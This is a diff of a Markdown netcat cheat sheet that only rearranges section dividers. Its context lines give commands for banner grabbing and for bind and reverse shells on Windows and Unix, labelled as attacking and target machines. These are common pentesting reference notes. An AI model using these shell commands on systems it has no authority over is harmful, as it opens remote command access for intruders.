@@ -8,10 +8,11 @@ tags:
 ---
 
 # Usage
+***
 Insert picture here
 
-***
 # Basic  
+***
 **TCP Port - Connecting**  
 `nc -nv <IP> <PORT>`
 
@@ -32,9 +33,8 @@ Insert picture here
 **Banner Grabbing**  
 `echo "" | nc -nv -w1 <IP Address> <Ports>`
 
-***
 # Windows  
-
+***
 **Bind Shell**  
 `nc -lvp 4444 -e cmd.exe`  
 `nc -nv <IP> 4444`
@@ -43,8 +43,8 @@ Insert picture here
 `nc -lvp 443 # Attacking Machine - Receiving`  
 `nc -nv <IP> 443 -e cmd.exe # Target Machine - Sending`
 
-***
 # Nix  
+***
 **Bind Shell**  
 `nc -lvp 4444 -e /bin/sh`  
 `nc -nv <IP> 4444`
@@ -53,9 +53,9 @@ Insert picture here
 `nc -lvp 443`  
 `nc -nv <IP> 443 -e /bin/sh`
 
-***
-# Additional Resources  
 
+# Additional Resources  
+***
 [SANS Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)  
 
 [Wikipedia](https://en.wikipedia.org/wiki/Netcat)
